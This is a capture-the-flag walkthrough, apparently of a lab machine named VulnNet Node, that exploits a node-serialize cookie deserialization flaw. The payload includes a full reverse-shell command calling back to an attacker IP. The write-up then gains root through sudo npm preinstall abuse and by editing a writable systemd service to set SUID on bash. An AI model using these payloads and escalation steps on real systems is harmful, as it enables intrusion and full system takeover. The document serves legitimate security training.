# ENUMERATION
Lets start with port scan.
```bash
Nmap scan report for 10.10.94.18
Host is up (0.23s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!

```

We have only one port open which is running nodejs. We can also verify this by *HTTP-Headers*.
```bash
HEAD / HTTP/1.1

HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D; Max-Age=1200; Path=/; Expires=Wed, 14 Apr 2021 18:32:37 GMT; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 7599
ETag: W/"1daf-dPXia8DLlOwYnTXebWSDo/Cj9Co"
Date: Wed, 14 Apr 2021 18:12:37 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

We have a header `X-Powered-By: Express` which tells the server is running NodeJs. Also we have a cookie already without any login. Decoding the cookie
```json
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
```
Changing username to `admin` and `isGuest` param to true, we were welcomed as admin. But nothing interesting. From this, lets try javascript deserialization attack.
Using few blog post, came across a payload. Final payload
```javascript
{"username":"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.5.42 9991 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) })","isGuest":true,"encoding": "utf-8"}
```
Base64 encode this and send it to the server. We have a connection back. 

### Shell as www-data
Looking at the *server.js*, we found the vulnerability. Our cookie was directly going in unserialize function without any sanitization.

```javascript
app.get('/', function(req, res) {
 if (req.cookies.session) {
   var str = new Buffer(req.cookies.session, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     var username2 = JSON.stringify(obj.username).replace(/[^0-9a-z]/gi, '');
     obj.username = username2
     res.render('../index', {username: obj.username})
```

Checking for command with sudo rights
```bash
Matching Defaults entries for www on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

We have rights to run `npm` as `serv-manage` user. Tried running it in */tmp* directory, but it was unsuccessful as we dont have write permission there. Only writable directory was */dev/shm* and obv our home dir.
```bash
cd /dev/shm
echo '{"scripts": {"preinstall": "/bin/sh"}}' > package.json
sudo -u serv-manage npm -C .i
```
Got shell as `serv-manage` user and can grab user.txt now.


### ROOT

Checking for sudo permission again for this user, we found:

```bash
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```
Current user can start and stop `vulnnet-auto.timer` service. Looking at permission of this service, seems to be writable by `serv-manage` user.
```bash
serv-manage@vulnnet-node:/dev/shm$ ls -la /etc/systemd/system/vulnnet-auto.timer
-rw-rw-r-- 1 root serv-manage 167 Jan 24 16:59 /etc/systemd/system/vulnnet-auto.timer
```
Looking at content of this service
```bash
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```
This service was calling another service named `vulnnet-job.service`. Checking permission of the same and it was readable & writable by our current user. Checking the content
```
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```

As we can edit this file, we can change the `ExecStart` param to execute a malicious command.
```bash
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=chmod +xs /bin/bash

[Install]
WantedBy=multi-user.target
```
The above changes in the service does not seems to work. Changing `ExecStart=chmod +xs /bin/bash` to `/bin/bash -c "chmod +xs /bin/bash"`.
```bash
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/bash -c "chmod +xs /bin/bash"

[Install]
WantedBy=multi-user.target
```
Starting the service. And we have suid bit set on `/bin/bash`
```bash
serv-manage@vulnnet-node:/dev/shm$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1113504 Apr  4  2018 /bin/bash
```
Now we can simply use `bash -p` and we are root.
